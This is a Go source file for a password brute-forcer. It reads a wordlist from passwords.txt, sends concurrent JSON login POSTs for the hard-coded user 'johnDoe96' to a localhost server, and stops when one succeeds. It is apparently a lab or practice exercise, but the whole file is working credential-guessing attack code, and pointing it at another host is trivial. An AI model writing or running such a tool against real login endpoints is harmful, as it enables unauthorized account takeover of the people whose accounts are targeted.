package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"sync"
)

const (
	host     = "http://localhost:8000"
	username = "johnDoe96"
)

func main() {
	var wg sync.WaitGroup

	for _, password := range getPasswords() {
		wg.Add(1)
		go func(password string) {
			defer wg.Done()
			statusCode, _, _ := post(host, username, password)
			if statusCode >= 200 && statusCode < 300 {
				fmt.Println("correct password is ", password)
				os.Exit(0)
			}
		}(password)
	}

	wg.Wait()
}

func check(err error) {
	if err != nil {
		log.Fatal(err.Error())
	}
}

func post(url, username, password string) (int, string, error) {
	requestBody, err := json.Marshal(map[string]string{
		"username": username,
		"password": password,
	})

	if err != nil {
		return 0, "", err
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(requestBody))
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return 0, "", err
	}
	return resp.StatusCode, string(body), nil

}

func getPasswords() []string {
	file, err := os.Open("passwords.txt")
	check(err)
	defer file.Close()

	fileReader := bufio.NewReader(file)

	passwords := make([]string, 0)

	for {
		password, err := fileReader.ReadBytes(byte('\n'))

		if err == io.EOF {
			fmt.Println("end of file")
			return passwords
		}

		if err != nil {
			check(err)
		}

		passwords = append(passwords, string(password[:len(password)-1]))
	}
}
